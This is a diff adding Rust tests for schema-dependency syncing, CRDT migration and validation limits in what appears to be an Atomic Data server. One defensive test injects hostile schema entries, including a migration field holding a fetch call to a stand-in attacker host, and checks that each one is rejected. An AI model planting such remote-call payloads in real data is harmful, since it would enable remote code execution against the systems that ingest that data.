@@ -211,7 +211,10 @@ async fn browser_and_native_share_identity_and_merge_nested_edits() {
         serde_jcs::to_vec(&fixture["bundle"]).unwrap()
     );
     let store = Db::init_temp("schema-browser-fixture").await.unwrap();
-    schema.register(&store).await.unwrap();
+    assert!(store
+        .get_resource(&schema.class_id.as_str().into())
+        .await
+        .is_err());
     let native = crate::agents::decode_base64(fixture["rust_edit"].as_str().unwrap()).unwrap();
     let browser =
         crate::agents::decode_base64(fixture["typescript_edit"].as_str().unwrap()).unwrap();
@@ -220,6 +223,11 @@ async fn browser_and_native_share_identity_and_merge_nested_edits() {
     let mut resource = Resource::new("atomic:example".into());
     resource.apply_state_doc(doc).unwrap();
     resource.check_required_props(&store).await.unwrap();
+    store.persist_replicated_resource(&resource).await.unwrap();
+    assert!(store
+        .get_resource(&schema.class_id.as_str().into())
+        .await
+        .is_ok());
     assert_eq!(
         resource
             .get(schema.property("envelope").unwrap())
@@ -348,4 +356,392 @@ async fn schema_validating_commit_rejects_an_invalid_nested_update() {
         .await
         .unwrap_err();
     assert!(error.to_string().contains("$/attack"), "{error}");
+}
+
+async fn slice(store: &Db) -> (AppSchema, Resource) {
+    let schema = audio();
+    schema.register(store).await.unwrap();
+    let mut resource = schema
+        .new_resource("atomic:schema-sync-slice".into())
+        .unwrap();
+    schema
+        .set(&mut resource, "tune", json!(7), store)
+        .await
+        .unwrap();
+    schema
+        .set(
+            &mut resource,
+            "envelope",
+            json!({"attack":0.01,"release":0.2}),
+            store,
+        )
+        .await
+        .unwrap();
+    (schema, resource)
+}
+
+#[tokio::test]
+async fn cold_sync_push_installs_dependencies_and_delta_reuses_them() {
+    use crate::{
+        agents::ForAgent,
+        db::trees::Tree,
+        sync::{engine, protocol},
+    };
+    let source = Db::init_temp("schema-sync-source").await.unwrap();
+    let (alice, drive) = source.setup("Alice").await.unwrap();
+    let (schema, mut resource) = slice(&source).await;
+    resource
+        .set_unsafe(
+            crate::urls::PARENT.into(),
+            Value::AtomicUrl(drive.clone().into()),
+        )
+        .unwrap();
+    resource
+        .set_unsafe(
+            crate::urls::DRIVE_PROP.into(),
+            Value::AtomicUrl(drive.clone().into()),
+        )
+        .unwrap();
+    let doc = resource.build_state_doc().unwrap();
+    let snapshot = doc.export_snapshot();
+    let version = doc.doc().oplog_vv();
+    let drive_snapshot = source
+        .kv
+        .get(Tree::LoroSnapshots, drive.as_bytes())
+        .unwrap()
+        .unwrap();
+    let frame = protocol::encode_sync_push(
+        &drive,
+        &[
+            (&drive, &drive_snapshot),
+            (resource.get_subject().as_str(), &snapshot),
+        ],
+        true,
+    );
+    let sink = Db::init_temp("schema-sync-cold").await.unwrap();
+    let mut agent = ForAgent::from(alice);
+    let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
+    assert!(output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
+    for id in schema.definitions.keys() {
+        assert!(sink.get_resource(&id.as_str().into()).await.is_ok());
+        // The cache does not introduce a public schema-by-hash read path.
+        assert!(sink
+            .get_resource_extended(&id.as_str().into(), true, &ForAgent::Public)
+            .await
+            .is_err());
+    }
+    schema
+        .patch(
+            &mut resource,
+            "envelope",
+            &["release"],
+            Some(json!(0.7)),
+            &source,
+        )
+        .await
+        .unwrap();
+    let delta = resource
+        .build_state_doc()
+        .unwrap()
+        .export_updates_since(&version);
+    assert!(delta.len() < snapshot.len());
+    let frame =
+        protocol::encode_sync_push(&drive, &[(resource.get_subject().as_str(), &delta)], true);
+    let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
+    assert!(output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
+    let received = sink.get_resource(resource.get_subject()).await.unwrap();
+    assert_eq!(
+        received
+            .get(schema.property("envelope").unwrap())
+            .unwrap()
+            .to_string(),
+        json!({"attack":0.01,"release":0.7}).to_string()
+    );
+}
+
+#[tokio::test]
+async fn hostile_dependencies_leave_no_resource_or_cache_entries() {
+    use super::dependencies::ROOT;
+    let source = Db::init_temp("schema-hostile-source").await.unwrap();
+    let (schema, resource) = slice(&source).await;
+    for attack in [
+        "tamper",
+        "missing",
+        "noncanonical",
+        "wrong-type",
+        "too-many",
+        "too-big",
+        "code",
+    ] {
+        let sink = Db::init_temp(&format!("schema-hostile-{attack}"))
+            .await
+            .unwrap();
+        let doc = resource.build_state_doc().unwrap();
+        let map = doc.doc().get_map(ROOT);
+        match attack {
+            "tamper" => {
+                map.insert(&schema.class_id, "{}").unwrap();
+            }
+            "missing" => {
+                map.delete(&schema.class_id).unwrap();
+            }
+            "noncanonical" => {
+                map.insert(
+                    &schema.class_id,
+                    serde_json::to_string_pretty(&schema.definitions[&schema.class_id]).unwrap(),
+                )
+                .unwrap();
+            }
+            "wrong-type" => {
+                map.insert(&schema.class_id, 1).unwrap();
+            }
+            "too-many" => {
+                for n in 0..513 {
+                    map.insert(&format!("key-{n}"), "{}").unwrap();
+                }
+            }
+            "too-big" => {
+                map.insert(&schema.class_id, "x".repeat(frozen::MAX_BYTES + 1))
+                    .unwrap();
+            }
+            "code" => {
+                let mut body = schema.definitions[&schema.class_id].clone();
+                body["urn:migration:execute"] = json!("fetch('https://attacker.invalid/')");
+                let id = frozen::id(&body).unwrap();
+                map.insert(&id, serde_jcs::to_string(&body).unwrap())
+                    .unwrap();
+            }
+            _ => unreachable!(),
+        }
+        let mut incoming = Resource::new(resource.get_subject().to_string());
+        incoming.apply_state_doc(doc).unwrap();
+        assert!(
+            sink.persist_replicated_resource(&incoming).await.is_err(),
+            "{attack}"
+        );
+        assert!(
+            sink.get_resource(resource.get_subject()).await.is_err(),
+            "{attack}"
+        );
+        for id in schema.definitions.keys() {
+            assert!(
+                sink.get_resource(&id.as_str().into()).await.is_err(),
+                "{attack}"
+            );
+        }
+    }
+}
+
+#[tokio::test]
+async fn rejected_sync_never_acknowledges_or_installs_definitions() {
+    use crate::{
+        agents::ForAgent,
+        sync::{engine, protocol},
+    };
+    let source = Db::init_temp("schema-sync-reject-source").await.unwrap();
+    let (schema, mut resource) = slice(&source).await;
+    let sink = Db::init_temp("schema-sync-reject-sink").await.unwrap();
+    let (alice, drive) = sink.setup("Alice").await.unwrap();
+    resource
+        .set_unsafe(
+            crate::urls::PARENT.into(),
+            Value::AtomicUrl(drive.clone().into()),
+        )
+        .unwrap();
+    resource
+        .set_unsafe(
+            crate::urls::DRIVE_PROP.into(),
+            Value::AtomicUrl(drive.clone().into()),
+        )
+        .unwrap();
+    for authorized in [false, true] {
+        let doc = resource.build_state_doc().unwrap();
+        if authorized {
+            doc.doc()
+                .get_map(super::dependencies::ROOT)
+                .insert(&schema.class_id, "{}")
+                .unwrap();
+        }
+        let frame = protocol::encode_sync_push(
+            &drive,
+            &[(resource.get_subject().as_str(), &doc.export_snapshot())],
+            true,
+        );
+        let mut agent = if authorized {
+            ForAgent::from(alice.clone())
+        } else {
+            ForAgent::Public
+        };
+        let output = engine::handle_frame_full(&frame, &sink, &mut agent).await;
+        assert!(output.frames.iter().any(|f| f[0] == protocol::tag::ERROR));
+        assert!(!output.frames.iter().any(|f| f[0] == protocol::tag::SYNC_OK));
+        for id in schema.definitions.keys() {
+            assert!(sink.get_resource(&id.as_str().into()).await.is_err());
+        }
+        assert!(sink.get_resource(resource.get_subject()).await.is_err());
+    }
+}
+
+#[tokio::test]
+async fn migration_coexists_with_concurrent_old_client_edits() {
+    let store = Db::init_temp("schema-migration-author").await.unwrap();
+    let (v1, mut migrated) = slice(&store).await;
+    let base = migrated.build_state_doc().unwrap().export_snapshot();
+    let mut old_client = Resource::new(migrated.get_subject().to_string());
+    old_client
+        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&base).unwrap())
+        .unwrap();
+    // A new representation gets new IDs. The app explicitly converts semitones
+    // to cents, preserving the old property for older writers.
+    let v2 = AppSchema::define(
+        "audio-slice-cents",
+        [(
+            "cents".into(),
+            Field {
+                required: true,
+                shape: Shape::Integer {
+                    minimum: Some(-4800.),
+                    maximum: Some(4800.),
+                },
+            },
+        )]
+        .into(),
+    )
+    .unwrap();
+    v2.register(&store).await.unwrap();
+    v2.set(&mut migrated, "cents", json!(700), &store)
+        .await
+        .unwrap();
+    migrated
+        .set_unsafe(
+            crate::urls::IS_A.into(),
+            Value::ResourceArray(vec![v2.class_id.clone().into()]),
+        )
+        .unwrap();
+    super::dependencies::attach(&mut migrated, &store)
+        .await
+        .unwrap();
+    v1.set(&mut old_client, "tune", json!(9), &store)
+        .await
+        .unwrap();
+    let merged = migrated.build_state_doc().unwrap();
+    merged
+        .import_update(&old_client.build_state_doc().unwrap().export_snapshot())
+        .unwrap();
+    migrated.apply_state_doc(merged).unwrap();
+    let cold = Db::init_temp("schema-migration-cold").await.unwrap();
+    cold.persist_replicated_resource(&migrated).await.unwrap();
+    assert_eq!(
+        migrated
+            .get(v1.property("tune").unwrap())
+            .unwrap()
+            .to_string(),
+        "9"
+    );
+    assert_eq!(
+        migrated
+            .get(v2.property("cents").unwrap())
+            .unwrap()
+            .to_string(),
+        "700"
+    );
+    // CRDT convergence preserves both edits. It does not recompute converted
+    // values: reconciling 900 vs 700 cents is an explicit application decision.
+    assert!(cold
+        .get_resource(&v1.property("tune").unwrap().into())
+        .await
+        .is_ok());
+    assert!(cold
+        .get_resource(&v2.class_id.as_str().into())
+        .await
+        .is_ok());
+    // Stale, valid attached definitions are not installed just for existing.
+    assert!(cold
+        .get_resource(&v1.class_id.as_str().into())
+        .await
+        .is_err());
+    let mut historical = Resource::new("atomic:historical-slice".into());
+    historical
+        .apply_state_doc(crate::loro::AtomicLoroDoc::from_snapshot(&base).unwrap())
+        .unwrap();
+    cold.persist_replicated_resource(&historical).await.unwrap();
+    assert!(cold
+        .get_resource(&v1.class_id.as_str().into())
+        .await
+        .is_ok());
+}
+
+#[tokio::test]
+async fn dependency_traversal_and_aggregate_bytes_are_bounded() {
+    use super::dependencies::ROOT;
+    let store = Db::init_temp("schema-budget").await.unwrap();
+    for deep in [false, true] {
+        let doc = crate::loro::AtomicLoroDoc::new();
+        let map = doc.doc().get_map(ROOT);
+        let mut previous = None;
+        for index in 0..if deep { 19 } else { 5 } {
+            let body = json!({
+                crate::urls::IS_A:[crate::urls::CLASS],
+                crate::urls::SHORTNAME:format!("class-{index}"),
+                crate::urls::DESCRIPTION:if deep { String::new() } else { "x".repeat(220 * 1024) },
+                crate::urls::REQUIRES: previous.iter().collect::<Vec<_>>(),
+                crate::urls::RECOMMENDS:[],
+            });
+            let id = frozen::id(&body).unwrap();
+            map.insert(&id, serde_jcs::to_string(&body).unwrap())
+                .unwrap();
+            previous = Some(id);
+        }
+        doc.set_property(
+            crate::urls::IS_A,
+            &Value::ResourceArray(vec![previous.unwrap().into()]),
+        )
+        .unwrap();
+        let mut resource = Resource::new("atomic:bounded-dependencies".into());
+        resource.apply_state_doc(doc).unwrap();
+        let error = super::dependencies::resolve(&resource, &store)
+            .await
+            .unwrap_err();
+        assert!(
+            error.to_string().contains(if deep {
+                "traversal limit"
+            } else {
+                "byte budget"
+            }),
+            "{error}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn cold_commit_validates_attachments_without_registering_them_during_validation() {
+    let source = Db::init_temp("schema-cold-commit-source").await.unwrap();
+    let (schema, resource) = slice(&source).await;
+    let sink = Db::init_temp("schema-cold-commit-sink").await.unwrap();
+    let commit = crate::commit::Commit {
+        subject: "https://example.com/cold-commit".into(),
+        created_at: 0,
+        signer: "atomic:agent:test".into(),
+        loro_update: Some(resource.build_state_doc().unwrap().export_snapshot()),
+        destroy: None,
+        signature: None,
+        previous_commit: None,
+        is_genesis: None,
+        url: None,
+    };
+    let mut opts = crate::commit::CommitOpts::no_validations_no_index();
+    opts.validate_schema = true;
+    let response = commit
+        .validate_and_build_response(&opts, &sink)
+        .await
+        .unwrap();
+    for id in schema.definitions.keys() {
+        assert!(sink.get_resource(&id.as_str().into()).await.is_err());
+    }
+    sink.persist_replicated_resource(&response.resource_new.unwrap())
+        .await
+        .unwrap();
+    for id in schema.definitions.keys() {
+        assert!(sink.get_resource(&id.as_str().into()).await.is_ok());
+    }
 }
